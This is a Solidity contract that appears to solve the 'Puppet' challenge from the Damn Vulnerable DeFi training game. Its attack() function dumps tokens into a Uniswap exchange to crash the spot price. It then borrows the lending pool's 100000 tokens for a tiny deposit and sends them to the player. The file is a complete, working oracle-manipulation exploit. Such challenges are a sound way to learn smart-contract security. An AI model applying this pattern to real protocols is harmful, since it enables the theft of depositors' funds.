// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../DamnValuableToken.sol";
import "./IUniswapExchange.sol";
import "./PuppetPool.sol";
import "hardhat/console.sol";

/**
 * @title PuppetPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract PuppetAttack {
    // address public immutable uniswapPair;
    DamnValuableToken public immutable token;
    IUniswapExchange public immutable exchange;
    PuppetPool public pool;
    address public player;
    uint256 amount1 = 1000 ether;
    uint256 amount2 = 100000 ether;

    constructor(
        address tokenAddress,
        address _player,
        address _exchange,
        address _pool
    ) payable {
        token = DamnValuableToken(tokenAddress);
        player = _player;
        exchange = IUniswapExchange(_exchange);
        pool = PuppetPool(_pool);
    }

    function attack() external {
        token.approve(address(exchange), amount1);
        exchange.tokenToEthSwapInput(amount1, 1, block.timestamp + 5000);
        uint256 depositRequired = pool.calculateDepositRequired(amount2);
        pool.borrow{value: depositRequired}(amount2, player);
        token.transfer(player, token.balanceOf(address(this)));
    }

    receive() external payable {}
}
